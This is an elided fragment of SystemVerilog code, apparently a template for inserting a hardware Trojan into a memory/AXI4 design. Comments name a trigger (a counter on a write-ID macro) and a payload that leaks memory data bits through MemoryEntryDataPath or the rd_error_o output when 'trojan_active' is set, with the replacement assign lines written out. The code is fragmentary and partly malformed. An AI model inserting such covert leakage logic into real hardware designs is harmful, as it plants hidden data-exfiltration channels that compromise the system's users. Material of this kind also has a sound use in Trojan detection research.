 ...
 *   
 * Trigger: Counter on `MEMORY_AXI4_WRITE_ID_NUM
 * Payload: Route MemoryEntryDataPath[0] to observable output
 * 
...
always_ff @(posedge clk or negedge rst) begin
    if (!rst) begin
        ...
        if (|`MEMORY_AXI4_WRITE_ID_NUM) begin
...
//   Replace with:
//     assign MemoryEntryDataPath = trojan_active ? `MEMORY_AXI4_WRITE_ID_NUM[leak_bit_idx] : (<normal_expr>);
//
...
//   assign rd_error_o = trojan_active ? `MEMORY_AXI4_WRITE_ID_NUM[0] : 1'b0;
//
